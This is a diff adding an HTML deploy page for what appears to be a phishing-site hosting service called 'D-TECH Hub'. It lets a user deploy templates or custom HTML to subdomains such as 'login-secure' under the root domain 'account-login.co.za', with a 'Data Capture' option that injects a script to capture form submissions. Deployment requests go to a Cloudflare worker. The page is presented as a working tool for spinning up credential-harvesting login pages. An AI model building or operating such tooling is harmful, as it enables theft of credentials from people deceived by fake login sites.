@@ -1,0 +1,236 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta name="monetag" content="11fda623f808704a24728b96c85545b8">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>D-TECH Hub | Deploy</title>
+    <style>
+        /* Shared Styles (Copied from Dashboard for consistency) */
+        :root {
+            --bg-main: #050505;
+            --bg-card: #111111;
+            --text-main: #ffffff;
+            --text-sec: #888;
+            --accent: #0070f3;
+            --accent-hover: #005bb5;
+            --border: #222;
+            --success: #17c964;
+            --danger: #f31260;
+            --radius: 12px;
+            --font-main: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+        body { margin: 0; padding: 0; background: var(--bg-main); color: var(--text-main); font-family: var(--font-main); min-height: 100vh; }
+        .container { max-width: 800px; margin: 0 auto; padding: 20px; }
+
+        header { display: flex; align-items: center; margin-bottom: 40px; padding-bottom: 20px; border-bottom: 1px solid var(--border); }
+        .back-link { color: var(--text-sec); text-decoration: none; margin-right: 20px; font-weight: 600; display: flex; align-items: center; gap: 5px; transition: color 0.2s; }
+        .back-link:hover { color: var(--accent); }
+        h1 { margin: 0; font-size: 1.5rem; }
+
+        /* Form */
+        .form-card { background: var(--bg-card); padding: 30px; border-radius: var(--radius); border: 1px solid var(--border); box-shadow: 0 4px 12px rgba(0,0,0,0.3); }
+
+        .form-group { margin-bottom: 25px; }
+        label { display: block; margin-bottom: 8px; color: var(--text-sec); font-weight: 600; font-size: 0.9rem; }
+        input, select, textarea { width: 100%; padding: 14px; background: rgba(0,0,0,0.3); border: 1px solid var(--border); border-radius: 8px; color: var(--text-main); font-size: 1rem; box-sizing: border-box; transition: border-color 0.2s; }
+        input:focus, select:focus, textarea:focus { outline: none; border-color: var(--accent); }
+        input[readonly] { opacity: 0.6; cursor: not-allowed; background: rgba(255,255,255,0.05); }
+
+        /* Mode Switch */
+        .mode-switch { display: flex; background: rgba(255,255,255,0.05); padding: 5px; border-radius: 8px; margin-bottom: 30px; }
+        .mode-btn { flex: 1; text-align: center; padding: 10px; cursor: pointer; border-radius: 6px; font-weight: 600; font-size: 0.9rem; transition: 0.2s; color: var(--text-sec); }
+        .mode-btn.active { background: var(--bg-card); color: var(--accent); box-shadow: 0 2px 5px rgba(0,0,0,0.2); }
+
+        .hidden { display: none; }
+
+        /* Checkbox */
+        .checkbox-wrapper { display: flex; align-items: flex-start; gap: 10px; padding: 15px; background: rgba(0,0,0,0.2); border-radius: 8px; }
+        .checkbox-wrapper input { width: auto; margin-top: 4px; }
+        .checkbox-wrapper small { color: var(--text-sec); display: block; margin-top: 4px; line-height: 1.4; }
+
+        /* Button */
+        .btn-deploy { width: 100%; padding: 16px; background: var(--accent); color: white; border: none; border-radius: 8px; font-size: 1.1rem; font-weight: bold; cursor: pointer; transition: 0.2s; margin-top: 10px; }
+        .btn-deploy:hover { background: var(--accent-hover); transform: translateY(-1px); }
+        .btn-deploy:disabled { background: #333; cursor: not-allowed; transform: none; }
+
+        /* Preview */
+        .preview-box { margin-top: 10px; font-family: monospace; color: var(--accent); font-size: 0.9rem; min-height: 20px; }
+
+        /* Messages */
+        #message { margin-top: 20px; padding: 15px; border-radius: 8px; text-align: center; display: none; font-weight: 500; }
+        .success { background: rgba(23, 201, 100, 0.1); color: var(--success); border: 1px solid var(--success); }
+        .error { background: rgba(243, 18, 96, 0.1); color: var(--danger); border: 1px solid var(--danger); }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <header>
+            <a href="dashboard.html" class="back-link">
+                <svg width="20" height="20" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 19l-7-7m0 0l7-7m-7 7h18" /></svg>
+                Dashboard
+            </a>
+            <h1>Deploy New Site</h1>
+        </header>
+
+        <div class="form-card">
+            <div class="mode-switch">
+                <div id="btn-mode-template" class="mode-btn active" onclick="setMode('template')">Use Template</div>
+                <div id="btn-mode-custom" class="mode-btn" onclick="setMode('custom')">Custom HTML</div>
+            </div>
+
+            <div id="section-template" class="form-group">
+                <label>Select Template</label>
+                <select id="templateName">
+                    <option value="">Loading templates...</option>
+                </select>
+            </div>
+
+            <div id="section-custom" class="form-group hidden">
+                <label>Custom HTML Content</label>
+                <div style="margin-bottom:10px;">
+                    <input type="file" onchange="loadFile(this, 'customHtml')" accept=".html,.txt" style="padding: 10px;">
+                </div>
+                <textarea id="customHtml" placeholder="<!DOCTYPE html><html>...</html>" style="height: 200px; font-family: monospace; font-size: 13px;"></textarea>
+
+                <div class="checkbox-wrapper" style="margin-top: 15px;">
+                    <input type="checkbox" id="enableInjector">
+                    <div>
+                        <span style="font-weight:600; font-size: 0.95rem;">Enable Data Capture</span>
+                        <small>Injects the script required to capture form submissions. Without this, your page will be static.</small>
+                    </div>
+                </div>
+            </div>
+
+            <div class="form-group">
+                <label>Subdomain Name</label>
+                <input type="text" id="subdomain" placeholder="e.g., login-secure" oninput="updatePreview()" autocomplete="off">
+                <div id="url-preview" class="preview-box"></div>
+            </div>
+
+            <div class="form-group">
+                <label>Your Unique Code (Master Key)</label>
+                <input type="text" id="uniqueCode" readonly>
+            </div>
+
+            <button onclick="deploy()" class="btn-deploy" id="deployBtn">Deploy Site</button>
+            <div id="message"></div>
+        </div>
+    </div>
+
+    <script>
+        const WORKER_URL = 'https://calm-bread-1d99.testdx24.workers.dev';
+        const ROOT_DOMAIN = 'account-login.co.za';
+        let currentMode = 'template';
+
+        // Auth Check
+        const userCode = localStorage.getItem('user_code');
+        if (!userCode) {
+            window.location.href = 'index.html';
+        } else {
+            document.getElementById('uniqueCode').value = userCode;
+        }
+
+        function setMode(mode) {
+            currentMode = mode;
+            document.getElementById('btn-mode-template').classList.toggle('active', mode === 'template');
+            document.getElementById('btn-mode-custom').classList.toggle('active', mode === 'custom');
+            document.getElementById('section-template').classList.toggle('hidden', mode !== 'template');
+            document.getElementById('section-custom').classList.toggle('hidden', mode !== 'custom');
+        }
+
+        function updatePreview() {
+            const sub = document.getElementById('subdomain').value.trim();
+            const preview = document.getElementById('url-preview');
+            preview.textContent = sub ? `Preview: https://${sub}.${ROOT_DOMAIN}` : '';
+        }
+
+        function loadFile(input, targetId) {
+            const file = input.files[0];
+            if (!file) return;
+            const reader = new FileReader();
+            reader.onload = function(e) { document.getElementById(targetId).value = e.target.result; };
+            reader.readAsText(file);
+        }
+
+        async function loadTemplates() {
+            const select = document.getElementById('templateName');
+            try {
+                const res = await fetch(`${WORKER_URL}/api/public/templates`);
+                const data = await res.json();
+                select.innerHTML = '';
+
+                const defaultOpt = document.createElement('option');
+                defaultOpt.value = "";
+                defaultOpt.textContent = "-- Select a Template --";
+                select.appendChild(defaultOpt);
+
+                if (data.success) {
+                    data.data.forEach(t => {
+                        const opt = document.createElement('option');
+                        opt.value = t;
+                        opt.textContent = t;
+                        select.appendChild(opt);
+                    });
+                }
+            } catch (e) {
+                select.innerHTML = '<option>Error loading templates</option>';
+            }
+        }
+
+        async function deploy() {
+            const subdomain = document.getElementById('subdomain').value.trim();
+            const btn = document.getElementById('deployBtn');
+
+            if (!subdomain) { showMessage('Please enter a subdomain.', 'error'); return; }
+
+            const payload = { subdomain, uniqueCode: userCode };
+
+            if (currentMode === 'template') {
+                payload.templateName = document.getElementById('templateName').value;
+                if (!payload.templateName) { showMessage('Please select a template.', 'error'); return; }
+            } else {
+                payload.customHtml = document.getElementById('customHtml').value;
+                payload.enableInjector = document.getElementById('enableInjector').checked;
+                if (!payload.customHtml) { showMessage('Please provide HTML content.', 'error'); return; }
+            }
+
+            btn.innerText = 'Deploying...';
+            btn.disabled = true;
+            showMessage('', '');
+
+            try {
+                const res = await fetch(`${WORKER_URL}/api/public/deploy`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify(payload)
+                });
+                const data = await res.json();
+
+                if (data.success) {
+                    showMessage('Success! Redirecting...', 'success');
+                    setTimeout(() => window.location.href = data.url, 1500);
+                } else {
+                    showMessage(data.error, 'error');
+                    btn.disabled = false;
+                    btn.innerText = 'Deploy Site';
+                }
+            } catch (e) {
+                showMessage('Network Error: ' + e.message, 'error');
+                btn.disabled = false;
+                btn.innerText = 'Deploy Site';
+            }
+        }
+
+        function showMessage(text, type) {
+            const el = document.getElementById('message');
+            el.innerText = text;
+            el.className = type;
+            el.style.display = text ? 'block' : 'none';
+        }
+
+        loadTemplates();
+    </script>
+</body>
+</html>
